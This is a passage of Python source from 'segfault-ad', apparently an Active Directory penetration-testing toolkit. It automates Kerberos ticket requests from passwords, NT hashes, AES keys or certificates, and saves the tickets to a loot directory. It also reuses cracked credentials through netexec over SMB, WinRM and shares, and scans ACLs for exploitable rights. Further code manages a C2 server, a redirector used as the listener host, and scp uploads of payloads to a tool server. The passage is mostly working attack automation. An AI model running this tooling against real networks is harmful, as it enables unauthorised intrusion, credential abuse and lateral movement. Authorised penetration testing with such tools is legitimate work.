                        log(f'{GREY}Shell: source {env_file}{RESET}','info')
                        add_result('tgt', f'{target.user} ccache')
                    os.chdir(orig_cwd); hr(); continue
                else:
                    # fallback: certipy auth
                    certipy = check_tool('certipy','certipy-ad')
                    if certipy:
                        log(f'{GREEN}PKINIT auth via certipy{RESET}','info')
                        cmd2 = [certipy, 'auth', '-pfx', pfx_prompt,
                                '-domain', TARGET.domain, '-dc-ip', TARGET.dc,
                                '-username', TARGET.user]
                        rc = run_cmd(cmd2, label='certipy auth PKINIT')
                        # certipy saves ccache as username.ccache in cwd
                        cwd_cc = f'{TARGET.user}.ccache'
                        if os.path.exists(cwd_cc):
                            import shutil; shutil.move(cwd_cc, ccache_out)
                            os.environ['KRB5CCNAME'] = ccache_out
                            env_file = os.path.join(TARGET.loot_dir, 'krb5.env')
                            open(env_file,'w').write(f'export KRB5CCNAME={ccache_out}\n')
                            log(f'{GREEN}TGT saved → {WHITE}{ccache_out}{RESET}','success')
                            log(f'{GREY}Shell: source {env_file}{RESET}','info')
                        os.chdir(orig_cwd); hr(); continue
                    else:
                        log('PKINITtools or certipy not found — install PKINITtools','error')
                        os.chdir(orig_cwd); hr(); continue
            elif aeskey:
                cmd2 = [getTGT, f'{TARGET.domain}/{TARGET.user}', '-aesKey', aeskey, '-dc-ip', TARGET.dc, '-no-pass']
            elif TARGET.password:
                cmd2 = [getTGT, f'{TARGET.domain}/{TARGET.user}:{TARGET.password}', '-dc-ip', TARGET.dc]
            elif TARGET.hash:
                cmd2 = [getTGT, f'{TARGET.domain}/{TARGET.user}', '-hashes', f':{TARGET.hash}', '-dc-ip', TARGET.dc]
            elif not pfx_prompt:
                log('Set password, hash, AES key, or provide a PFX cert','error')
                os.chdir(orig_cwd); hr(); continue
            rc = run_cmd(cmd2, label='getTGT')
            # if failed (RC4 disabled), retry with kinit which uses AES by default
            if rc != 0 and TARGET.password and not aeskey:
                log(f'{ORANGE}RC4 disabled — retrying with kinit (uses AES){RESET}','warn')
                kinit = check_tool('kinit')
                if kinit:
                    upn = f'{TARGET.user}@{TARGET.domain.upper()}'
                    env2 = os.environ.copy()
                    env2['KRB5CCNAME'] = ccache_out
                    proc = subprocess.Popen([kinit, upn],
                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, text=True, env=env2)
                    try:
                        out2, _ = proc.communicate(input=TARGET.password+'\n', timeout=10)
                        for l in out2.splitlines(): print(f'  {GREY}{l}{RESET}')
                    except subprocess.TimeoutExpired: proc.kill()
            os.chdir(orig_cwd)
            if os.path.exists(ccache_out):
                os.environ['KRB5CCNAME'] = ccache_out
                env_file = os.path.join(TARGET.loot_dir, 'krb5.env')
                open(env_file,'w').write(f'export KRB5CCNAME={ccache_out}\n')
                log(f'{GREEN}TGT saved → {WHITE}{ccache_out}{RESET}','success')
                log(f'{GREY}Shell: source {env_file}{RESET}','info')
                add_result('tgt', f'{TARGET.user} ccache')
            hr()
        elif cmd == 'clockskew': do_clockskew(TARGET)
        elif cmd == 'install':  run_install()
        elif cmd == 'plugins':  _show_plugins()
        elif cmd == 'clear':    os.system('clear')
        elif cmd in ('exit','quit','q'): sys.stdout.write('\033[r'); sys.stdout.flush(); log('Exiting','info'); sys.exit(0)
        elif cmd in MODULES:
            try:
                mod_instance = MODULES[cmd]()
                if not mod_instance.check_cache(TARGET):
                    continue
                mod_instance.run(TARGET)
                # mark as done with last session result as summary
                last = _SESSION_RESULTS[-1] if _SESSION_RESULTS else {}
                mod_instance.mark_done(TARGET, last.get('detail','') if last.get('module')==cmd else '')
            except (EOFError,KeyboardInterrupt):
                print()
                log(f'Module interrupted — returning to REPL','warn')
                with _ACTIVE_PROCS_L:
                    for _p in list(_ACTIVE_PROCS):
                        try: _p.terminate()
                        except Exception: pass
                    _ACTIVE_PROCS.clear()
            except Exception as exc:
                import traceback as _tb
                full_tb = _tb.format_exc()
                log(f'Module error: {exc}','error')
                log(f'{GREY}{full_tb.splitlines()[-2].strip()}{RESET}','warn')
                _logfile(f'MODULE ERROR [{cmd}]:\n{full_tb}','error')
                if os.environ.get('SEGFAULT_DEBUG'):
                    for l in full_tb.splitlines(): print(f'  {GREY}{l}{RESET}')
        else: log(f'Unknown: {cmd} -- type help','warn')


def _auto_cred_reuse(target, new_user, new_pass=None, new_hash=None):
    """After cracking a new credential, auto-retry key modules with it.
    Runs: ldapenum, asreproast, kerberoast, shares, nxcmodules users — in background."""
    if not new_user: return
    log(f'{PINK}[auto-reuse]{RESET} New cred {WHITE}{new_user}{RESET} — retrying enum modules...','info')

    import copy as _copy
    fake = _copy.copy(target)
    fake.user     = new_user
    fake.password = new_pass or target.password
    fake.hash     = new_hash or (target.hash if not new_pass else None)

    results = []

    # 1. quick SMB auth check
    nxc = check_tool('netexec','nxc')
    if nxc and target.dc:
        auth = ['-u',new_user]
        if new_pass:  auth += ['-p',new_pass]
        elif new_hash: auth += ['-H',new_hash]
        rc, out_lines = run_cmd_capture([nxc,'smb',target.dc]+auth, label=f'auth check {new_user}')
        out_str = '\n'.join(out_lines)
        if 'Pwn3d!' in out_str:
            log(f'{RED}[auto-reuse] {GREEN}LOCAL ADMIN{RESET} on {WHITE}{target.dc}{RESET}','success')
            results.append('local admin')
            add_result('auto-reuse', f'{new_user} = LOCAL ADMIN on {target.dc}')
        elif '[+]' in out_str:
            log(f'{GREEN}[auto-reuse] Auth valid for {WHITE}{new_user}{RESET}','success')

    # 2. check winrm
    if nxc and target.dc:
        auth = ['-u',new_user]
        if new_pass:  auth += ['-p',new_pass]
        elif new_hash: auth += ['-H',new_hash]
        rc, out_lines = run_cmd_capture([nxc,'winrm',target.dc]+auth, label=f'winrm check {new_user}')
        if any('Pwn3d!' in l or '[+]' in l for l in out_lines):
            log(f'{GREEN}[auto-reuse] WinRM access for {WHITE}{new_user}{RESET}','success')
            add_result('auto-reuse', f'{new_user} → WinRM on {target.dc}')

    # 3. shares
    if nxc and target.dc:
        auth = ['-u',new_user]
        if new_pass:  auth += ['-p',new_pass]
        elif new_hash: auth += ['-H',new_hash]
        rc, out_lines = run_cmd_capture([nxc,'smb',target.dc]+auth+['--shares'],
                                        label=f'shares {new_user}')
        readable = [l for l in out_lines if 'READ' in l or 'WRITE' in l]
        if readable:
            log(f'{GREEN}[auto-reuse] {len(readable)} share(s) accessible as {WHITE}{new_user}{RESET}','success')
            add_result('auto-reuse', f'{new_user} → {len(readable)} shares')

    # 4. quick aclscan if abuseACL available
    t_acl = check_tool('abuseACL')
    if t_acl and target.dc and target.domain:
        auth_str = f'{target.domain}/{new_user}'
        if new_pass:  auth_str += f':{new_pass}'
        rc, out_lines = run_cmd_capture(
            [t_acl, f'{auth_str}@{target.dc}'],
            label=f'aclscan {new_user}')
        DANGEROUS = {'GenericAll','WriteDacl','WriteOwner','ForceChangePassword',
                     'AddMember','GetChangesAll'}
        hits = [l for l in out_lines if any(d in l for d in DANGEROUS)]
        if hits:
            log(f'{RED}[auto-reuse] {len(hits)} exploitable ACE(s) for {WHITE}{new_user}{RESET}','success')
            for h in hits[:5]: print(f'  {RED}→{RESET} {h}')
            add_result('auto-reuse', f'{new_user} → {len(hits)} exploitable ACEs')

    if results:
        log(f'{GREEN}[auto-reuse] Summary: {", ".join(results)}{RESET}','success')
    else:
        log(f'{GREY}[auto-reuse] No immediate escalation paths for {new_user}{RESET}','info')


def _load_hivemind_state():
    """Load Hivemind rack config from ~/.segfault-ad/hivemind_state."""
    state_file = os.path.expanduser('~/.segfault-ad/hivemind_state')
    if not os.path.exists(state_file): return {}
    try:
        import configparser as _cp
        cfg = _cp.ConfigParser()
        cfg.read(state_file)
        s = cfg['hivemind'] if 'hivemind' in cfg else {}
        return {
            'c2':          s.get('c2','').strip(),
            'redirector':  s.get('redirector','').strip(),
            'toolserver':  s.get('toolserver','').strip(),
            'logger':      s.get('logger','').strip(),
            'loot_dir':    s.get('loot_dir','/opt/hivemind/loot').strip(),
            'tools_port':  s.get('tools_port','443').strip(),
        }
    except Exception:
        return {}

_HIVEMIND = _load_hivemind_state()

def _hivemind_redirector():
    """Return redirector IP if Hivemind is configured."""
    return _HIVEMIND.get('redirector','')

def _hivemind_toolserver():
    """Return tool server IP if Hivemind is configured."""
    return _HIVEMIND.get('toolserver','')

def hivemind_status():
    """Show Hivemind rack status inline."""
    if not _HIVEMIND:
        log(f'{ORANGE}Hivemind not configured — add ~/.segfault-ad/hivemind_state{RESET}','warn')
        log(f'{GREY}Write hivemind_state with [hivemind] section containing c2, redirector, toolserver, logger IPs{RESET}','info')
        return

    hr()
    log(f'{C0}{BOLD}hivemind rack status{RESET}','info')
    print()

    nodes = [
        ('c2',         'C2 Server',   RED),
        ('redirector', 'Redirector',  ORANGE),
        ('toolserver', 'Tool Server', C0),
        ('logger',     'Logger',      PURPLE),
    ]

    for key, label, col in nodes:
        ip = _HIVEMIND.get(key,'')
        if not ip:
            print(f'  {RED}■{RESET} {col}{label:<14}{RESET}  {GREY}not configured{RESET}')
            continue
        # quick ping check
        rc = subprocess.run(['ping','-c','1','-W','1',ip],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
        dot = f'{GREEN}■{RESET}' if rc == 0 else f'{RED}■{RESET}'
        status = f'{GREEN}up{RESET}' if rc == 0 else f'{RED}unreachable{RESET}'
        print(f'  {dot} {col}{label:<14}{RESET}  {WHITE}{ip:<18}{RESET}  {status}')

    print()
    redir = _hivemind_redirector()
    tools = _hivemind_toolserver()
    if redir: log(f'Use redirector {WHITE}{redir}{RESET} as lhost for listeners','info')
    if tools: log(f'Tool server: {C0}https://{tools}:{_HIVEMIND.get("tools_port","443")}/payloads/{RESET}','info')
    hr()

def hivemind_upload(local_path):
    """Upload a file to the Hivemind tool server."""
    ts = _hivemind_toolserver()
    if not ts:
        log('Hivemind tool server not configured','error'); return None
    loot_dir  = _HIVEMIND.get('loot_dir', '/opt/hivemind/loot')
    port      = _HIVEMIND.get('tools_port','443')
    fname     = os.path.basename(local_path)
    dest      = f'{loot_dir}/payloads/{fname}'
    key       = os.path.expanduser('~/.ssh/id_ed25519')
    log(f'Uploading {WHITE}{fname}{RESET} → tool server', 'info')
    rc = subprocess.run(
        ['scp','-i',key,'-o','StrictHostKeyChecking=no',
         local_path, f'pi@{ts}:{dest}'],
        capture_output=True)
    if rc.returncode == 0:
        url = f'https://{ts}:{port}/payloads/{fname}'
        log(f'{GREEN}Uploaded → {WHITE}{url}{RESET}','success')
        return url
    else:
        log(f'Upload failed: {rc.stderr.decode()[:100]}','error')
        return None


def _load_spawn_state():
    """Auto-load target from spawn.py state file if present."""
    spawn_state = os.path.expanduser('~/.segfault-ad/spawn_state')
    if not os.path.exists(spawn_state): return False
    try:
        import configparser as _cp
        cfg = _cp.ConfigParser()
        cfg.read(spawn_state)
        s = cfg['spawn'] if 'spawn' in cfg else {}
        ip     = s.get('ip','').strip()
        name   = s.get('name','').strip()
        domain = s.get('domain','').strip()
        fqdn   = s.get('fqdn','').strip()
        if not ip: return False
        TARGET.dc = ip

        # ── auto-discover real domain via ldapsearch namingContexts ──────
        try:
            ldaps = check_tool('ldapsearch')
            if ldaps:
                out = subprocess.check_output(
                    [ldaps,'-x','-H',f'ldap://{ip}','-s','base','namingContexts'],
                    stderr=subprocess.DEVNULL, timeout=5, text=True, errors='replace')
                for line in out.splitlines():
                    if line.startswith('namingContexts: DC='):
                        # parse DC=cicada,DC=htb → cicada.htb
                        parts = [p.split('=')[1] for p in line.split(': ')[1].split(',')
                                 if p.upper().startswith('DC=')]
                        if parts:
                            domain = '.'.join(parts)
                            # also try to guess DC FQDN from DNS SRV
                            fqdn = f'{name.upper()}-DC.{domain}'
                            break
        except Exception:
            pass

        if domain: TARGET.domain = domain
        if fqdn:   TARGET.dc_fqdn = fqdn

        log(f'{GREEN}spawn.py state loaded:{RESET} {WHITE}{name}{RESET} @ {WHITE}{ip}{RESET}','success')
        if domain: log(f'  domain: {WHITE}{domain}{RESET}','info')
        if fqdn:   log(f'  fqdn:   {WHITE}{fqdn}{RESET}','info')
        return True
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(prog='segfault-ad',
        description='segfault-ad -- AD pentest toolkit // segfault.solutions')
    parser.add_argument('-d','--domain',   help='Domain (e.g. domain.local)')
    parser.add_argument('-u','--user',     help='Username')
    parser.add_argument('-p','--password', help='Password')
    parser.add_argument('-H','--hash',     help='NT hash for PTH')
    parser.add_argument('--dc',            help='DC IP address')
    parser.add_argument('--dc-fqdn',       help='DC FQDN (e.g. dc01.domain.local)')
    parser.add_argument('--workspace','-w',help='Load workspace on startup')
    parser.add_argument('--yes','-y',      action='store_true', help='Auto-confirm all prompts (non-interactive)')
    parser.add_argument('--quiet','-q',    action='store_true', help='Skip banner animation, minimal output')
    parser.add_argument('--timeout',       type=int, default=300, help='Default subprocess timeout in seconds (default: 300)')
    parser.add_argument('--run',           help='Run a module on startup (e.g. --run nmap)')
    args = parser.parse_args()

    # apply global flags
    global _CMD_TIMEOUT, _YES_MODE, _QUIET_MODE
    _CMD_TIMEOUT = args.timeout
    _YES_MODE    = args.yes
    _QUIET_MODE  = args.quiet

    # load spawn.py state first (lowest priority — CLI args override)
    _load_spawn_state()

    if args.domain:   TARGET.domain   = args.domain
    if args.user:     TARGET.user     = args.user
    if args.password: TARGET.password = args.password
    if args.hash:     TARGET.hash     = args.hash
    if args.dc:       TARGET.dc       = args.dc
    if hasattr(args,'dc_fqdn') and args.dc_fqdn: TARGET.dc_fqdn = args.dc_fqdn

    # load workspace if specified
    if args.workspace:
        _load_workspace(TARGET, args.workspace)

    if not _QUIET_MODE:
        _startup_banner()
    else:
        log(f'segfault-ad v{VERSION} // segfault.solutions','info')

    # run a module on startup if specified
    if args.run:
        cmd = args.run.strip().lower()
        if cmd in MODULES:
            try: MODULES[cmd]().run(TARGET)
            except Exception as e: log(f'Startup module error: {e}','error')

    repl()



if __name__ == '__main__':
    main()